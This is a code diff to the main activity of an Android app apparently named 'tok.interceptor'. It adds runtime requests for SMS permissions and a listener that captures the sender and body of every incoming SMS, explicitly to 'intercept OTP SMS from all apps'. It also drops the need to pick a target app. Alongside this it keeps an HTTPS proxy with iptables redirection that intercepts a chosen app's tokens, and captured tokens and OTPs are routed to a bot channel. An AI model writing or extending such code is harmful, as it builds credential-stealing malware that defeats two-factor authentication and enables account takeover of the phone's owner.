@@ -1,5 +1,6 @@
 package com.tok.interceptor;
 
+import android.Manifest;
 import android.app.*;
 import android.content.*;
 import android.content.pm.*;
@@ -9,7 +10,8 @@ import android.widget.*;
 
 public class MainActivity extends Activity {
 
-    private static final int REQ_PICK_APP = 1;
+    private static final int REQ_PICK_APP    = 1;
+    private static final int REQ_SMS_PERMS   = 2;
 
     private EditText etBotToken, etChannelId, etTargetApp;
     private TextView tvStatus, tvLog;
@@ -49,6 +51,11 @@ public class MainActivity extends Activity {
         selectedUid     = prefs.getInt("target_uid", -1);
         etTargetApp.setText(selectedPackage);
 
+        // hook SMS listener so received messages show in the log
+        SmsBroadcastReceiver.setListener((sender, body) ->
+            runOnUiThread(() -> log("📱 SMS from " + sender + ": " + body))
+        );
+
         btnPickApp.setOnClickListener(v ->
             startActivityForResult(
                 new Intent(this, AppPickerActivity.class), REQ_PICK_APP));
@@ -71,6 +78,31 @@ public class MainActivity extends Activity {
                 }
             });
         }).start();
+
+        // request SMS permissions at runtime (Android 6+)
+        requestSmsPermissions();
+    }
+
+    private void requestSmsPermissions() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED
+             || checkSelfPermission(Manifest.permission.READ_SMS)    != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(new String[]{
+                    Manifest.permission.RECEIVE_SMS,
+                    Manifest.permission.READ_SMS
+                }, REQ_SMS_PERMS);
+            }
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int req, String[] perms, int[] grants) {
+        if (req == REQ_SMS_PERMS) {
+            boolean ok = true;
+            for (int g : grants) if (g != PackageManager.PERMISSION_GRANTED) { ok = false; break; }
+            if (ok) log("✅ SMS permissions granted — will intercept OTP SMS from all apps");
+            else    log("⚠ SMS permissions denied — SMS interception disabled");
+        }
     }
 
     @Override
@@ -94,9 +126,6 @@ public class MainActivity extends Activity {
         if (botToken.isEmpty() || channelId.isEmpty()) {
             toast("Fill in Bot Token and Channel ID"); return;
         }
-        if (selectedUid == -1) {
-            toast("Pick a target app first"); return;
-        }
 
         prefs.edit()
             .putString("bot_token",  botToken)
@@ -106,19 +135,38 @@ public class MainActivity extends Activity {
 
         tvStatus.setText("⏳ Starting...");
         btnStartStop.setEnabled(false);
-        iptablesManager = new IptablesManager(selectedUid);
+
+        // SMS interception works globally — no target app needed
+        // HTTPS proxy still needs a target UID
+        boolean hasTarget = selectedUid != -1;
+        if (hasTarget) {
+            iptablesManager = new IptablesManager(selectedUid);
+        }
 
         new Thread(() -> {
+            StringBuilder startLog = new StringBuilder();
             try {
-                proxyManager.start();
-                Thread.sleep(1000);
-                iptablesManager.start();
+                // SMS interception is always active once permissions are granted
+                startLog.append("SMS OTP interception active for all apps\n");
+
+                // Start HTTPS proxy if a target app was chosen
+                if (hasTarget) {
+                    proxyManager.start();
+                    Thread.sleep(500);
+                    iptablesManager.start();
+                    startLog.append("HTTPS proxy active for ").append(selectedPackage);
+                } else {
+                    startLog.append("(No target app — HTTPS proxy skipped)");
+                }
+
                 running = true;
+                final String logMsg = startLog.toString();
                 runOnUiThread(() -> {
-                    tvStatus.setText("🟢 Intercepting — " + selectedPackage);
+                    tvStatus.setText("🟢 Intercepting — SMS + " + (hasTarget ? selectedPackage : "no HTTPS"));
                     btnStartStop.setText("Stop");
                     btnStartStop.setEnabled(true);
-                    log("Started. Tokens will appear in " + channelId);
+                    log(logMsg);
+                    log("Tokens/OTPs will appear in " + channelId);
                 });
             } catch (Exception e) {
                 runOnUiThread(() -> {
